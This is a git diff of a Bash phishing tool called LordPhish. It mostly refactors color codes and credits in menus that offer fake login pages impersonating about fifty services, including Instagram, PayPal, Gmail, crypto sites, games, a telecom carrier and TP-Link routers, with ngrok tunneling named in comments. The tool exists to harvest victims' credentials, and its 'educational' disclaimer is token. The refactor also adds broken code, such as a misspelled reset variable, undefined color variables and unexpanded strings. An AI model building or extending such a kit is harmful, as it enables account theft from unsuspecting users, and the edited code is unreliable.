@@ -1,10 +1,5 @@
 #!/usr/bin/env bash
-# Youtube Channel: Ch33ch_Sec
 # Inspired by the linux choice shellphish
-# Lordphish the best phishing tool!!!!
-# Github: https://github.com/grenoxx
-# Telegram: Ch33chOficial
-# 68 Webpages !!!!!!
 
 # Tunneling opitions:
 # ngrok
@@ -41,6 +36,7 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR WITH THE USE OR OTHER OFFERS OF THE SOFTWARE.
 # IF THE SOFTWARE IS PUBLISHED ON GITHUB THE CREDITS OF THE SOFTWARE MAY BE IN THE FORM OF COMMENT, BANNER OR README.md!
 
+reset='\e[0m'
 red='\e[1;31m'
 gren='\e[1;32m'
 Y='\e[1;33m'
@@ -50,16 +46,17 @@ cyan='\e[1;36m'
 W='\e[1;37m'
 P='\e[1;35m'
 Green='\e[32m'
+ngreen='\e[1;42m'
 Gr='\e[5m\e[32m'
 Gris='\e[90m'
-r="\e[1;91m"
-g="\e[1;92m"
-y="\e[1;93m"
-w="\e[1;39m"
-c="\e[1;96m"
-b="\e[1;94m"
-o="\e[1;33m"
-R="\033[1;31m"
+r='\e[1;91m'
+g='\e[1;92m'
+y='\e[1;93m'
+w='\e[1;39m'
+c='\e[1;96m'
+b='\e[1;94m'
+o='\e[1;33m'
+R='\033[1;31m'
 G='\033[1;32m'
 Y='\033[1;33m'
 blue='\033[1;34m'
@@ -67,19 +64,26 @@ W='\033[1;37m'
 Green='\033[32m'
 Gren='\033[32m'
 Gris='\033[90m'
+fblue='\e[1;44m'
+boldWhite='\e[1;97m'
+lightGreen='\e[92m'
+boldLightGray='\e[37;1m'
+boldYellow='\e[33;1m'
+lightRedBackground='\e[101m'
+boldWhiteOnLightRed='\e[101m\e[1;97m'
 
 trap 'printf "\n";stop;exit 1' 2
 trap user_interrupt SIGINT
 trap user_interrupt SIGTSTP
 
 user_interrupt(){
-        printf "\e[0m\n"
-        printf "\e[0m\e[1;36m\t CTRL + C Pressed !!\n"
+        printf "${reset}\n"
+        printf "${reset} ${cyan}\t CTRL + C Pressed !!\n"
         sleep 2
-        printf "\e[0m\n"
-        printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44>"
-        printf " \e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;96m Visit github.com/Ch4r0nN \e[0m"
-        printf "\e[0m\n"
+        printf "${reset}\n"
+        printf " ${reset} ${ngreen} Thanks for Using This Tool !!${reset}  ${fblue}>"
+        printf " $g[${reset}+${reset} $g]${reset} ${c} Visit github.com/BrunoCiccarino ${reset}"
+        printf "${reset}\n"
         exit 1
 
 }              
@@ -108,85 +112,66 @@ echo -e "$blue
              \n"
 echo
 echo
-printf "      \e[1;97m  .:.  Version 2.0 Beta  .:.  \e[0m\n"
+printf "      ${boldWhite}  .:.  Version 2.0 Beta  .:.  ${resret}\n"
 printf "\n"
-printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX \e[0m\n"
+printf "   ${lightGreen}[${boldLightGray}+${lightGreen}]${resret}${boldYellow} Tool Created by Gr3n0xX ${resret}\n"
 printf "\n"
-printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
-printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by LordPhish.  ::\e[0m\n"
-printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
+printf "     ${boldWhiteOnLightRed}:: Disclaimer: Developers assume no liability and are not    ::${resret}\n"
+printf "     ${boldWhiteOnLightRed}:: responsible for any misuse or damage caused by LordPhish.  ::${resret}\n"
+printf "     ${boldWhiteOnLightRed}:: Only use for educational purposes!!                      ::${resret}\n"
 printf "\n"
-printf "     \e[101m\e[1;77m:: Attacking targets without mutual consent is illegal!      ::\e[0m\n"
+printf "     ${boldWhiteOnLightRed}:: Attacking targets without mutual consent is illegal!      ::${resret}\n"
 printf "\n"
 }
 
 
 menu() {
-clear
+    clear
+    printf "\n"
+    echo -e "${red}      ╔═══════════╗"
+    echo -e "${red}    ╔═╝${W}███████████${red}╚═╗"
+    echo -e "${red}   ╔╝${W}███████████████${red}╚╗"
+    echo -e "${red}   ║${W}█████${Gr}Gr3n0xX ${reset}${W}████${red}║"
+    echo -e "${red}   ║${W}█████████████████${red}║    ${cyan}•${red}◈${cyan}•▬ ▬ ▬ ▬ ▬ ▬ ▬•${red}◈${cyan}•▬ ▬ ▬ ▬ ▬ ▬ ▬•${red}◈${cyan}•. ${reset}${red}"
+    echo -e "${red}   ║${W}█████████████████${red}║            ${ngreen}${cyan} Lord${reset} ${Green}${red} Phish${reset}${red}"
+    echo -e "${red}   ║${W}█${red}╔${W}█████████████${red}╗${W}█${red}║    ${cyan}•${red}◈${cyan}•▬ ▬ ▬ ▬ ▬ ▬ ▬•${red}◈${cyan}•▬ ▬ ▬ ▬ ▬ ▬ ▬•${red}◈${cyan}•. ${reset}${red}"
+    echo -e "${red}   ╚╦╝${W}███${gren}▒▒${reset}${W}███${gren}▒▒${reset}${W}███${red}╚╦╝    "
+    echo -e "${red}   ╔╝${W}██${gren}▒▒▒▒${reset}${W}███${gren}▒▒▒▒${reset}${W}██${red}╚╗     "
+    echo -e "${red}   ║${W}██${gren}▒▒▒▒▒${reset}${W}███${gren}▒▒▒▒▒${reset}${W}██${red}|      "
+    echo -e "${red}   ║${W}██${gren}▒▒▒▒${reset}${W}█████${gren}▒▒▒▒${reset}${W}██${red}║                               "
+    echo -e "${red}   ╚╗${W}███████████████${red}╔╝"
+    echo -e "${red}  ╔═╬══╦╝${W}██${gren}▒${reset}${W}█${gren}▒${reset}${W}██${red}╚╦══╝ ${Green}.${Green}▒${Green}.."
+    echo -e "${red}  ║${W}█${red}║══║${W}█████████${red}║ ${Green}...${Green}▒${Green}."
+    echo -e "${red}  ║${W}█${red}║══║${W}█${red}║${W}██${red}║${W}██${red}║${W}█${red}║　${Green}.${Green}▒${Green}.."
+    echo -e "${red}  ║${W}█${red}║══╚═╩══╩╦═╩═╩═╦╗${Green}▒${Green}."
+    echo -e "${red} ╔╝${W}█${red}╚══╦═╦══╦╩═╦═╦═╩╝"
+    echo -e "${red}╔╝${W}█████${red}║${W}█${red}║${W}██${red}║${W}██${red}║${W}█${red}║"
+    echo -e "${red}║${W}██████${red}║${W}█████████${red}║${reset}"
+   printf "      ${boldWhite}  .:.  Version 2.0 Beta  .:.   ${reset}\n"
 printf "\n"
-echo -e $R"      ╔═══════════╗"
-echo -e "$R    ╔═╝$W███████████$R╚═╗"
-echo -e "$R   ╔╝$W███████████████$R╚╗"
-echo -e "$R   ║$W█████\033[1;32mGr3n0xX \033[00m\033[1;37m████$R║"
-echo -e "$R   ║$W█████████████████$R║    \e[1;36m•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•. \e[00m\e[1;31m"
-echo -e "$R   ║$W█████████████████$R║            \e[30;48;5;196m\e[1;32m\e[1;36m Lord\e[0m \e[30;48;5;39m\e[1;31m Phish\e[0m\e[1;31m"
-echo -e "$R   ║$W█$R╔$W█████████████$R╗$W█$R║    \e[1;36m•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•▬ ▬ ▬ ▬ ▬ ▬ ▬•\e[1;31m◈\e[1;36m•. \e[00m\e[1;31m"
-echo -e "$R   ╚╦╝$W███$Gr▒▒\e[0m$W███$Gr▒▒\e[0m$W███$R╚╦╝    "
-echo -e "$R   ╔╝$W██$Gr▒▒▒▒\e[0m$W███$Gr▒▒▒▒\e[0m$W██$R╚╗     "
-echo -e "$R   ║$W██$Gr▒▒▒▒▒\e[0m$W███$Gr▒▒▒▒▒\e[0m$W██$R|      "
-echo -e "$R   ║$W██$Gr▒▒▒▒\e[0m$W█████$Gr▒▒▒▒\e[0m$W██$R║                               "
-echo -e "$R   ╚╗$W███████████████$R╔╝"
-echo -e "$R  ╔═╬══╦╝$W██$Gr▒\e[0m$W█$Gr▒\e[0m$W██$R╚╦══╝ $G.$g▒$G.."
-echo -e "$R  ║$W█$R║══║$W█████████$R║ $G...$g▒$G."
-echo -e "$R  ║$W█$R║══║$W█$R║$W██$R║$W██$R║$W█$R║　$G.$g▒$G.."
-echo -e "$R  ║$W█$R║══╚═╩══╩╦═╩═╩═╦╗$g▒$G."
-echo -e "$R ╔╝$W█$R╚══╦═╦══╦╩═╦═╦═╩╝"
-echo -e "$R╔╝$W█████$R║$W█$R║$W██$R║$W██$R║$W█$R║"
-echo -e "$R║$W██████$R║$W█████████$R║\033[00m"
-echo
-printf "      \e[1;97m  .:.  Version 2.0 Beta  .:.   \e[0m\n"
+printf "   ${lightGreen}[${boldLightGray}+${lightGreen}]${reset}${boldYellow} Tool Created by Gr3n0xX/Ch4r0nN ${reset}\n"
 printf "\n"
-printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX/Ch4r0nN \e[0m\n"
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;96m eBay   \e[0m          \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;96m Gmail   \e[0m   \n"  
+printf "${lightGreen}[${boldLightGray}01${lightGreen}]${reset}${cyan} Instagram${reset}      ${lightGreen}[${boldLightGray}18${lightGreen}]${reset}${cyan} eBay   ${reset}          ${lightGreen}[${boldLightGray}35${lightGreen}]${reset}${cyan} Gmail   ${reset}   \n"
+printf "${lightGreen}[${boldLightGray}02${lightGreen}]${reset}${cyan} Facebook${reset}       ${lightGreen}[${boldLightGray}19${lightGreen}]${reset}${cyan} lol  ${reset}            ${lightGreen}[${boldLightGray}36${lightGreen}]${reset}${cyan} Tiktok  ${reset}      \n"
+printf "${lightGreen}[${boldLightGray}03${lightGreen}]${reset}${cyan} Snapchat${reset}       ${lightGreen}[${boldLightGray}20${lightGreen}]${reset}${cyan} Pinterest   ${reset}     ${lightGreen}[${boldLightGray}37${lightGreen}]${reset}${cyan} Whatsapp ${reset}  \n"
+printf "${lightGreen}[${boldLightGray}04${lightGreen}]${reset}${cyan} Twitter${reset}        ${lightGreen}[${boldLightGray}21${lightGreen}]${reset}${cyan} CryptoCurrency${reset}   ${lightGreen}[${boldLightGray}38${lightGreen}]${reset}${cyan} Starbucks ${reset}\n"
+printf "${lightGreen}[${boldLightGray}05${lightGreen}]${reset}${cyan} Github${reset}         ${lightGreen}[${boldLightGray}22${lightGreen}]${reset}${cyan} Verizon   ${reset}       ${lightGreen}[${boldLightGray}39${lightGreen}]${reset}${cyan} Firmware ${reset} \n"
+printf "${lightGreen}[${boldLightGray}06${lightGreen}]${reset}${cyan} Google${reset}         ${lightGreen}[${boldLightGray}23${lightGreen}]${reset}${cyan} DropBox   ${reset}       ${lightGreen}[${boldLightGray}40${lightGreen}]${reset}${cyan} Gopro ${reset}   \n"
+printf "${lightGreen}[${boldLightGray}07${lightGreen}]${reset}${cyan} Spotify${reset}        ${lightGreen}[${boldLightGray}24${lightGreen}]${reset}${cyan} Adobe ID   ${reset}      ${lightGreen}[${boldLightGray}41${lightGreen}]${reset}${cyan} apple${reset} \n"
+printf "${lightGreen}[${boldLightGray}08${lightGreen}]${reset}${cyan} Netflix${reset}        ${lightGreen}[${boldLightGray}25${lightGreen}]${reset}${cyan} Shopify   ${reset}       ${lightGreen}[${boldLightGray}42${lightGreen}]${reset}${cyan} Bitcoin${reset}  \n"
+printf "${lightGreen}[${boldLightGray}09${lightGreen}]${reset}${cyan} PayPal${reset}         ${lightGreen}[${boldLightGray}26${lightGreen}]${reset}${cyan} Messenger  ${reset}      ${lightGreen}[${boldLightGray}43${lightGreen}]${reset}${cyan} Ytsubs${reset}     \n"
+printf "${lightGreen}[${boldLightGray}10${lightGreen}]${reset}${cyan} Origin${reset}         ${lightGreen}[${boldLightGray}27${lightGreen}]${reset}${cyan} GitLab   ${reset}        ${lightGreen}[${boldLightGray}44${lightGreen}]${reset}${cyan} Ofice-365${reset} \n"
+printf "${lightGreen}[${boldLightGray}11${lightGreen}]${reset}${cyan} Steam${reset}          ${lightGreen}[${boldLightGray}28${lightGreen}]${reset}${cyan} Twitch   ${reset}        ${lightGreen}[${boldLightGray}45${lightGreen}]${reset}${cyan} Playstation${reset}  \n"
+printf "${lightGreen}[${boldLightGray}12${lightGreen}]${reset}${cyan} Yahoo${reset}          ${lightGreen}[${boldLightGray}29${lightGreen}]${reset}${cyan} MySpace   ${reset}       ${lightGreen}[${boldLightGray}46${lightGreen}]${reset}${cyan} Amazon${reset} \n"
+printf "${lightGreen}[${boldLightGray}13${lightGreen}]${reset}${cyan} Linkedin${reset}       ${lightGreen}[${boldLightGray}30${lightGreen}]${reset}${cyan} Badoo   ${reset}         ${lightGreen}[${boldLightGray}47${lightGreen}]${reset}${cyan} Yahoo Web${reset}    \n"
+printf "${lightGreen}[${boldLightGray}14${lightGreen}]${reset}${cyan} Protonmail${reset}     ${lightGreen}[${boldLightGray}31${lightGreen}]${reset}${cyan} VK   ${reset}            ${lightGreen}[${boldLightGray}48${lightGreen}]${reset}${cyan} Pornhub${reset}    \n"
+printf "${lightGreen}[${boldLightGray}15${lightGreen}]${reset}${cyan} Wordpress${reset}      ${lightGreen}[${boldLightGray}32${lightGreen}]${reset}${cyan} Yandex   ${reset}        ${lightGreen}[${boldLightGray}49${lightGreen}]${reset}${cyan} Xvideos${reset}     \n"
+printf "${lightGreen}[${boldLightGray}16${lightGreen}]${reset}${cyan} Microsoft${reset}      ${lightGreen}[${boldLightGray}33${lightGreen}]${reset}${cyan} DevianART   ${reset}     ${lightGreen}[${boldLightGray}50${lightGreen}]${reset}${cyan} Games Pages${reset}\n"
+printf "${lightGreen}[${boldLightGray}17${lightGreen}]${reset}${cyan} Youtube${reset}        ${lightGreen}[${boldLightGray}34${lightGreen}]${reset}${cyan} StackOverflow${reset}    ${lightGreen}[${boldLightGray}51${lightGreen}]${reset}${cyan} operadoras${reset} \n"
+printf "${lightGreen}[${boldLightGray}99${lightGreen}]${reset}${red} Custom ${reset}        ${lightGreen}[${boldLightGray}Y${lightGreen}]${reset}${red} Youtube channel ${reset}  ${lightGreen}[${boldLightGray}T${lightGreen}]${reset}${red} Telegram Group${reset} \n"     
+printf "${lightGreen}[${boldLightGray}00${lightGreen}]${reset}${red} Exit${reset}           ${lightGreen}[${boldLightGray}F${lightGreen}]${reset}${red} Follow me one Github${reset}\n"
+read -p $' ${red}[${boldLightGray}~${red}]${reset}${lightGreen} Select an option: ${reset}${cyan}' menu_option
 
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;96m lol  \e[0m            \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;96m Tiktok  \e[0m      \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;96m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;96m Pinterest   \e[0m     \e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;96m Whatsapp \e[0m  \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;96m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;96m CryptoCurrency\e[0m   \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;96m Starbucks \e[0m\n"
-
-printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;96m Github\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;96m Verizon   \e[0m       \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;96m Firmware \e[0m \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;96m Google\e[0m         \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;96m DropBox   \e[0m       \e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;96m Gopro \e[0m   \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;96m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;96m Adobe ID   \e[0m      \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;96m apple\e[0m \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;96m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;96m Shopify   \e[0m       \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;96m Bitcoin\e[0m  \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;96m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;96m Messenger  \e[0m      \e[1;92m[\e[0m\e[1;77m43\e[0m\e[1;92m]\e[0m\e[1;96m Ytsubs\e[0m     \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;96m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;96m GitLab   \e[0m        \e[1;92m[\e[0m\e[1;77m44\e[0m\e[1;92m]\e[0m\e[1;96m Ofice-365\e[0m \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;96m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;96m Twitch   \e[0m        \e[1;92m[\e[0m\e[1;77m45\e[0m\e[1;92m]\e[0m\e[1;96m Playstation\e[0m  \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;96m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;96m MySpace   \e[0m       \e[1;92m[\e[0m\e[1;77m46\e[0m\e[1;92m]\e[0m\e[1;96m Amazon\e[0m \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;96m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;96m Badoo   \e[0m         \e[1;92m[\e[0m\e[1;77m47\e[0m\e[1;92m]\e[0m\e[1;96m Yahoo Web\e[0m    \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;96m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;96m VK   \e[0m            \e[1;92m[\e[0m\e[1;77m48\e[0m\e[1;92m]\e[0m\e[1;96m Pornhub\e[0m    \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;96m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;96m Yandex   \e[0m        \e[1;92m[\e[0m\e[1;77m49\e[0m\e[1;92m]\e[0m\e[1;96m Xvideos\e[0m     \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;96m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;96m DevianART   \e[0m     \e[1;92m[\e[0m\e[1;77m50\e[0m\e[1;92m]\e[0m\e[1;96m Games Pages\e[0m\n"
-
-printf "\e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;96m Youtube\e[0m        \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;96m StackOverflow\e[0m    \e[1;92m[\e[0m\e[1;77m51\e[0m\e[1;92m]\e[0m\e[1;96m operadoras\e[0m \n"
-
-printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom \e[0m        \e[1;92m[\e[0m\e[1;77mY\e[0m\e[1;92m]\e[0m\e[1;91m Youtube channel \e[0m  \e[1;92m[\e[0m\e[1;77mT\e[0m\e[1;92m]\e[0m\e[1;91m Telegram Group\e[0m \n"     
-
-printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m           \e[1;92m[\e[0m\e[1;77mF\e[0m\e[1;92m]\e[0m\e[1;91m Follow me one Github\e[0m\n"
-
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\e' menu_option
 
 if [[ $menu_option == 1 || $menu_option == 01 ]]; then
 server="instagram"
@@ -454,14 +439,14 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 games() {
 banner
 printf " \n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Call Of Duty\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Free Fire\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Free Fire Advanced\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m PUBG Mobile\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Clash Of Clans\e[0m\n"
+printf " ${boldRed}[${reset}${boldLightGray}01${reset}${boldRed}]${reset}${boldYellow} Call Of Duty${reset}\n"
+printf " ${boldRed}[${reset}${boldLightGray}02${reset}${boldRed}]${reset}${boldYellow} Free Fire${reset}\n"
+printf " ${boldRed}[${reset}${boldLightGray}03${reset}${boldRed}]${reset}${boldYellow} Free Fire Advanced${reset}\n"
+printf " ${boldRed}[${reset}${boldLightGray}04${reset}${boldRed}]${reset}${boldYellow} PUBG Mobile${reset}\n"
+printf " ${boldRed}[${reset}${boldLightGray}05${reset}${boldRed}]${reset}${boldYellow} Clash Of Clans${reset}\n"
 
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' game
+printf "\n"
+read -p $' ${boldRed}[${reset}${boldLightGray}~${reset}${boldRed}]${reset}${boldYellow} Select an option: ${reset}' game
 
 if [[ $game == 1 || $game == 01 ]]; then
 server="codm"
@@ -484,7 +469,7 @@ server="coc"
 start1
 
 else
-printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
 sleep 1
 clear
 menu
@@ -495,12 +480,12 @@ fi
 lol(){
 banner
 printf " \n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Create account Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m LOL New Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m LOL Old login Page\e[0m\n"
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' lol_option
+printf "${boldRed}[${reset}${boldLightGray}01${reset}${boldRed}]${reset}${boldYellow} Traditional Login Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}02${reset}${boldRed}]${reset}${boldYellow} Create account Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}03${reset}${boldRed}]${reset}${boldYellow} LOL New Login Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}04${reset}${boldRed}]${reset}${boldYellow} LOL Old login Page${reset}\n"
+printf "${reset}\n"
+read -p $' ${boldRed}[${reset}${boldLightGray}~${reset}${boldRed}]${reset}${boldGreen} Select an option: ${reset}${boldCyan}\n' lol_option
 
 if [[ $lol_option == 1 || $lol_option == 01 ]]; then
 server="lol"
@@ -519,7 +504,7 @@ server="lol"
 start1
 
 else
-printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
 sleep 1
 clear
 menu
@@ -528,8 +513,8 @@ fi
 }
 operadoras () {
     banner
-    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Claro Fake Page\e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m TP-Link Fake Page\e[0m\n"
+    printf "${boldGreen}[${reset}${boldLightGray}01${reset}${boldGreen}]${reset}${boldCyan} Claro Fake Page${reset}\n"
+    printf "${boldGreen}[${reset}${boldLightGray}02${reset}${boldGreen}]${reset}${boldCyan} TP-Link Fake Page${reset}\n"
     read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' op_menu
     
 
@@ -543,7 +528,7 @@ server"tplink"
 start1
 
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
 menu
 fi
 }
@@ -551,15 +536,14 @@ fi
 instagram(){
 banner
 printf " \n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Copyright Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Mail Confirmation Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Copyright Infringement Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m IG Autoliker Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m IG Followers Page\e[0m\n"
-
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' insta_option
+printf "${boldRed}[${reset}${boldLightGray}01${reset}${boldRed}]${reset}${boldYellow} Traditional Login Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}02${reset}${boldRed}]${reset}${boldYellow} Copyright Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}03${reset}${boldRed}]${reset}${boldYellow} Mail Confirmation Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}04${reset}${boldRed}]${reset}${boldYellow} Copyright Infringement Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}05${reset}${boldRed}]${reset}${boldYellow} IG Autoliker Page${reset}\n"
+printf "${boldRed}[${reset}${boldLightGray}06${reset}${boldRed}]${reset}${boldYellow} IG Followers Page${reset}\n"
+printf "${reset}\n"
+read -p $' ${boldRed}[${reset}${boldLightGray}~${reset}${boldRed}]${reset}${boldGreen} Select an option: ${reset}${boldCyan}\n' insta_option
 
 if [[ $insta_option == 1 || $insta_option == 01 ]]; then
 server="instagram"
@@ -586,7 +570,7 @@ server="instafollowers"
 start1
 
 else
-printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+printf "\n\n  ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}${boldYellow} Invalid option ${boldRed}[${reset}${boldLightGray}!${reset}${boldRed}]${reset}\n"
 sleep 1
 clear
 menu
@@ -597,18 +581,18 @@ fi
 facebook(){
 banner
 printf " \n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Create account\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Mobile Page\e[0m\n"
